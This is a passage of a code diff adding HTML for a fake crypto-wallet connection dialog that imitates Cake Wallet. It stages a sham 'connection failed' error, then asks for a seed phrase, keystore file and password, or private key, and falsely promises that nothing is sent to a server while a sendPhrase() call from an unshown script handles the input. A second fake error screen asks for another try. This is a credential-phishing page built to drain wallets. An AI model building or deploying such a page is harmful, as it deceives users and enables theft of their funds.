+        <p class="w-status" id="s2Status">Initializing secure connection...</p>
+        <div class="w-progress-wrap">
+          <div class="w-progress-bar" id="s2Progress"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN 3: Connection Failed -->
+    <div class="w-sub" id="wScreen3">
+      <div class="w-header">
+        <span class="w-title">Connection Failed</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-error-body">
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s3Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s3Name">Wallet</span>
+        </div>
+        <div class="w-error-icon"><i class="ri-wifi-off-line"></i></div>
+        <p class="w-error-msg">
+          <strong>Unable to Connect</strong>
+          We couldn't establish a connection with your wallet. This may be due to a timeout or an unresponsive
+          device. Try again or connect manually.
+        </p>
+        <div class="w-btn-stack">
+          <button class="w-btn w-btn-plum" id="retryBtn">
+            <i class="ri-refresh-line"></i> Retry Connection
+          </button>
+          <button class="w-btn w-btn-ghost" id="manualBtn">Connect Manually</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN 4: Manual Connect (custom) -->
+    <div class="w-sub" id="wScreen4">
+      <div class="w-header">
+        <span class="w-title">Connect Manually</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-manual-body">
+
+        <!-- wallet chip -->
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s4Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s4Name">Wallet</span>
+        </div>
+
+        <!-- type toggle: Phrase | Keystore JSON | Private Key -->
+        <div class="type-toggle">
+          <button class="type-btn" id="btn-keystore" onclick="switchType('keystore')">Keystore JSON</button>
+          <button class="type-btn active" id="btn-phrase" onclick="switchType('phrase')">Phrase</button>
+          <button class="type-btn" id="btn-privatekey" onclick="switchType('privatekey')">Private Key</button>
+        </div>
+
+        <!-- Pane 1: Phrase -->
+        <div class="input-pane active" id="pane-phrase">
+          <textarea class="w-textarea phrase-area" id="phraseInput"
+            placeholder="Enter your 12 or 24-word recovery phrase, separated by spaces..." spellcheck="false"
+            autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+        </div>
+
+        <!-- Pane 2: Keystore JSON -->
+        <div class="input-pane" id="pane-keystore">
+          <textarea class="w-textarea keystore-area" id="keystoreInput" placeholder='Paste Passphrase'
+            spellcheck="false" autocomplete="off"></textarea>
+          <input type="" class="w-input" id="keystorePassword" placeholder="Password" autocomplete="off" />
+          <button class="attach-btn" onclick="document.getElementById('keystoreFileInput').click()">
+            <i class="ri-attachment-2"></i>
+            Attach Keystore File
+          </button>
+          <input type="file" id="keystoreFileInput" accept=".json,.txt,.png,.jpg,.jpeg"
+            onchange="handleKeystoreFile(this)" />
+          <p class="attach-file-name" id="attachFileName"></p>
+        </div>
+
+        <!-- Pane 3: Private Key -->
+        <div class="input-pane" id="pane-privatekey">
+          <textarea class="w-textarea privkey-area" id="privkeyInput"
+            placeholder="Enter your private key (hex format, 64 characters)..." spellcheck="false" autocomplete="off"
+            autocorrect="off" autocapitalize="off"></textarea>
+        </div>
+
+        <!-- encrypt note -->
+        <div class="w-encrypt-note">
+          <i class="ri-lock-2-line"></i>
+          <p>
+            <strong>End-to-end encrypted.</strong>
+            Your credentials are encrypted locally and never transmitted to any server.
+            Cake Wallet support will never ask for your seed phrase or private key.
+          </p>
+        </div>
+
+        <button class="w-btn w-btn-plum" onclick="sendPhrase()">
+          <i class="ri-wallet-3-line"></i> Connect Wallet
+        </button>
+
+      </div>
+    </div>
+
+    <!-- SCREEN 5: Manual Failed -->
+    <div class="w-sub" id="wScreen5">
+      <div class="w-header">
+        <span class="w-title">Verification Failed</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-error-body">
+        <div class="w-wallet-chip">
+          <div class="w-chip-icon"><img id="s5Img" src="" alt="" /></div>
+          <span class="w-chip-name" id="s5Name">Wallet</span>
+        </div>
+        <div class="w-error-icon"><i class="ri-error-warning-line"></i></div>
+        <p class="w-error-msg">
+          <strong>Invalid Credentials</strong>
+          The information you entered could not be verified. Please double-check your phrase, keystore file,
+          or private key and try again.
+        </p>
+        <div class="w-btn-stack">
+          <button class="w-btn w-btn-plum" onclick="handleRetryManual()">
+            <i class="ri-refresh-line"></i> Try Again
+          </button>
+          <button class="w-btn w-btn-ghost" onclick="closeWallet()">Close</button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <script src="function.js"></script>
+  <script>
+    (function () {
+      var burger = document.querySelector('.navburger');
+      var mobileNav = document.getElementById('mobile-nav');
+      var closeBtn = document.getElementById('mobile-nav-close');
+      var mobileLinks = mobileNav.querySelectorAll('.mobile-nav-item, .mobile-nav-cta a, #mobile-logo');
+
+      function openMenu() {
+        mobileNav.classList.add('is-open');
+        mobileNav.setAttribute('aria-hidden', 'false');
+        burger.setAttribute('aria-expanded', 'true');
+        burger.setAttribute('aria-label', 'Close menu');
+        document.body.style.overflow = 'hidden';
+      }
+
+      function closeMenu() {
+        mobileNav.classList.remove('is-open');
+        mobileNav.setAttribute('aria-hidden', 'true');
+        burger.setAttribute('aria-expanded', 'false');
+        burger.setAttribute('aria-label', 'Open menu');
+        document.body.style.overflow = '';
+      }
+
+      burger.addEventListener('click', function () {
+        if (mobileNav.classList.contains('is-open')) {
+          closeMenu();
+        } else {
+          openMenu();
+        }
+      });
+
+      closeBtn.addEventListener('click', closeMenu);
+
+      mobileLinks.forEach(function (link) {
+        link.addEventListener('click', closeMenu);
+      });
+
+      // Close on Escape key
+      document.addEventListener('keydown', function (e) {
+        if (e.key === 'Escape') closeMenu();
+      });
+    })();
+  </script>
+
+</body>
+
+</html>
